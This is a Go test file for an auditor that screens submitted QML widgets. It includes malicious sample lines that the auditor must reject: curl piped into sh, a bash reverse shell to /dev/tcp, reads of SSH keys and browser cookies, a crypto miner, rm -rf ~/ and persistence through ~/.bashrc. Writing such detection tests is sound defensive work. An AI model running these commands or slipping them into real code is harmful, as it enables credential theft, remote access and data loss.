package hub

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func auditItem(t *testing.T, files map[string]string, hub map[string]any) (*Repo, *Card) {
	t.Helper()
	root := t.TempDir()
	folder := filepath.Join(root, "widgets", "w")
	for name, body := range files {
		p := filepath.Join(folder, name)
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if hub == nil {
		hub = map[string]any{"version": "1.0.0"}
	}
	r := &Repo{Root: root}
	e := &entry{id: "w", kind: Kinds[0], folder: folder, item: map[string]any{}}
	r.audit(e, folder, filepath.Join(folder, "hub.json"), hub, map[string]bool{})
	return r, e.card
}

func has(list []string, part string) bool {
	for _, s := range list {
		if strings.Contains(s, part) {
			return true
		}
	}
	return false
}

func TestAuditRefusesMalice(t *testing.T) {
	cases := map[string]string{
		`command: ["bash", "-c", "curl -s https://x.example.org/i | sh"]`: "pipes a download into a shell",
		`onClicked: eval(field.text)`:                                     "runs code built from a string",
		`Component.onCompleted: Qt.createQmlObject(src, root)`:            "builds QML from a string",
		`source: "https://cdn.example.org/w.qml"`:                         "loads code from the internet",
		`property string p: atob(blob)`:                                   "decodes hidden content",
		`command: ["cat", Quickshell.env("HOME") + "/.ssh/id_ed25519"]`:   "reads keys or passwords",
		`path: home + "/.config/chromium/Default/Cookies"`:                "browser's cookies",
		`command: ["yt-dlp", "--cookies-from-browser", "firefox"]`:        "browser's cookies",
		`path: "~/.config/gh/hosts.yml"`:                                  "tokens or credentials",
		`command: ["sudo", "tee", "/etc/x"]`:                              "asks for root",
		`path: "~/.config/autostart/w.desktop"`:                           "run outside the shell",
		`command: ["sh", "-c", "echo w >> ~/.bashrc"]`:                    "run outside the shell",
		`url: "https://discord.com/api/webhooks/1/abc"`:                   "drop point",
		`url: "http://45.33.32.156/up"`:                                   "bare IP",
		`command: ["xmrig", "-o", "pool"]`:                                "mines",
		`command: ["sh", "-c", "rm -rf ~/"]`:                              "destroys",
		`path: "/dev/input/event3"`:                                       "keyboard or mouse",
		`command: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/9 0>&1"]`:  "remote shell",
		`property string k: "` + strings.Repeat("QUJD", 70) + `"`:         "encoded blob",
		"property string s: \"safe‮\"":                                    "invisible",
		"property int a‍b: 1":                                             "invisible",
	}
	for line, why := range cases {
		r, _ := auditItem(t, map[string]string{"W.qml": "Item {\n    " + line + "\n}\n"}, nil)
		if !has(r.Errors, why) {
			t.Errorf("%q: want an error saying %q, got %v", line, why, r.Errors)
		}
	}
}

func TestAuditLetsHonestCodeThrough(t *testing.T) {
	code := strings.Join([]string{
		`Item {`,
		`    readonly property int profile: PowerProfiles.profile`,
		`    property string hint: Translation.tr("No supported browser detected. Import a cookies file instead.")`,
		`    property string cookies: "/path/to/cookies.txt"`,
		`    property string anki: "http://127.0.0.1:8765"`,
		`    property string assistant: "http://192.168.1.10:8123/api"`,
		"    property string coder: \"\U0001F469‍\U0001F4BB\"",
		"    property string key: \"\\u200B\" + name",
		`    property var todo: Todo.list`,
		`}`,
	}, "\n")
	r, card := auditItem(t, map[string]string{"W.qml": code}, nil)
	if len(r.Errors) > 0 || card.Slop > 0 {
		t.Errorf("honest code refused: %v, score %d %v", r.Errors, card.Slop, card.SlopWhy)
	}
}

func TestAuditFiles(t *testing.T) {
	r, _ := auditItem(t, map[string]string{
		"lib.so":    "\x7fELF\x02\x01",
		"run":       "\x7fELF\x00\x00",
		".hook.sh":  "true\n",
		"Min.js":    "var a=1;" + strings.Repeat("b=a+1;c=b*2;", 60),
		"W.qml":     "Item {}\n",
		"assets/ok": "plain words\n",
	}, nil)
	for _, why := range []string{"lib.so: .so files are not accepted", "run: a binary", "hidden files", "Min.js: minified"} {
		if !has(r.Errors, why) {
			t.Errorf("want %q in %v", why, r.Errors)
		}
	}
	if has(r.Errors, "assets/ok") {
		t.Errorf("plain text refused: %v", r.Errors)
	}

	root := t.TempDir()
	folder := filepath.Join(root, "widgets", "w")
	os.MkdirAll(folder, 0o755)
	os.Symlink("/etc/passwd", filepath.Join(folder, "W.qml"))
	r = &Repo{Root: root}
	r.audit(&entry{id: "w", kind: Kinds[0], folder: folder}, folder, filepath.Join(folder, "hub.json"), map[string]any{}, map[string]bool{})
	if !has(r.Errors, "symlinks") {
		t.Errorf("symlink accepted: %v", r.Errors)
	}
}

func TestAuditHosts(t *testing.T) {
	code := "Item {\n    function get() { const x = new XMLHttpRequest(); x.open(\"GET\", \"https://api.weather.example.org/now\") }\n}\n"
	r, card := auditItem(t, map[string]string{"W.qml": code}, map[string]any{"version": "1.0.0"})
	if !has(r.Errors, `api.weather.example.org: list every host`) {
		t.Errorf("undeclared host accepted: %v", r.Errors)
	}
	if !has(card.Hosts, "api.weather.example.org") {
		t.Errorf("card misses the host: %v", card.Hosts)
	}
	r, _ = auditItem(t, map[string]string{"W.qml": code}, map[string]any{"version": "1.0.0", "hosts": []any{"example.org"}})
	if len(r.Errors) > 0 {
		t.Errorf("a declared domain should cover its subdomains: %v", r.Errors)
	}
	r, _ = auditItem(t, map[string]string{"W.qml": code}, map[string]any{"version": "1.0.0", "hosts": []any{"https://example.org/"}})
	if !has(r.Errors, `"hosts" lists host names`) {
		t.Errorf("a URL in hosts accepted: %v", r.Errors)
	}
}

func TestAuditSlop(t *testing.T) {
	var b strings.Builder
	b.WriteString("Item {\n")
	for i := range 6 {
		b.WriteString("    // This component provides a robust and seamless way to handle the clock\n")
		b.WriteString("    // TODO: implement this\n")
		b.WriteString("    function f" + string(rune('a'+i)) + "() { console.log(\"debug\") }\n")
	}
	b.WriteString("    // ✨ done\n}\n")
	files := map[string]string{"W.qml": b.String()}
	listing := map[string]any{"version": "1.0.0", "summary": "The ultimate, stunning clock"}

	r, card := auditItem(t, files, listing)
	if card.Slop < slopError || !has(r.Errors, "reads as generated without review") {
		t.Errorf("slop accepted: score %d %v, errors %v", card.Slop, card.SlopWhy, r.Errors)
	}
	for _, why := range []string{"TODOs", "debug prints", "chatbot", "emoji in comments", "marketing words"} {
		if !has(card.SlopWhy, why) {
			t.Errorf("score misses %q: %v", why, card.SlopWhy)
		}
	}

	r, _ = auditItem(t, files, listing)
	os.WriteFile(filepath.Join(r.Root, "reviewed.json"), []byte(`{"items": ["w@1.0.0"]}`), 0o644)
	r.Errors = nil
	e := &entry{id: "w", kind: Kinds[0], item: map[string]any{}}
	folder := filepath.Join(r.Root, "widgets", "w")
	r.audit(e, folder, filepath.Join(folder, "hub.json"), listing, map[string]bool{})
	if has(r.Errors, "reads as generated") || !e.card.Reviewed {
		t.Errorf("a reviewed version still refused: %v", r.Errors)
	}
}
